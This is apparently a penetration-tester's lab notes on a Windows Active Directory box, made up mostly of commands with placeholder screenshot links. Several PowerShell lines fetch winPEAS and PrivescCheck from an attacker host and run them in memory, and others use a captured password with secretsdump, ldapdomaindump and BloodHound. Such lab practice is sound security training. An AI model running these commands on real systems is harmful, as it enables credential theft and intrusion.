
![[Pasted image 20240924041011.png]]

![[Pasted image 20240924041046.png]]

```
Invoke-WebRequest -Uri http://10.10.16.6/Auto/winPEASx64.exe -OutFile winpeas.exe
```
![[Pasted image 20240924042731.png]]

I think some kind of antivirus is running behind
![[Pasted image 20240924043719.png]]

Now there are 2 ways either to try 
ldap
secrets dump
bloodhound
and see what we get so that we can escalate 


Secrets Dump
```
secretsdump.py holo.live/tushikikatomo:'finance1'@10.10.10.179
```

Ldap
```
ldapdomaindump ldaps://10.10.10.179 -u 'megacorp.local\tushikikatomo' -p 'finance1'
```
![[Pasted image 20240924141609.png]]

Bloodhound
```
bloodhound-python -d megacorp.local -u tushikikatomo -p 'finance1' -ns 10.10.10.179  -c all
```



Let's get back to script and see what we can do there
```
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.20/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended
```

```
Invoke-WebRequest -Uri http://10.10.16.6/Auto/winPEASx64.exe -OutFile winpeas.exe
```

```
IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.6/Auto/winPEASx64.exe'); Invoke-winPEASx64 -Extended
```

```
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.6/Auto/winPEASx64.exe') | powershell -noprofile -
```


```
IEX(New-Object Net.WebClient).downloadString('http://10.10.16.6/PEASS-ng/winPEAS/winPEASps1/winPEAS.ps1')
```

PEASS-ng/winPEAS/winPEASps1/winPEAS.ps1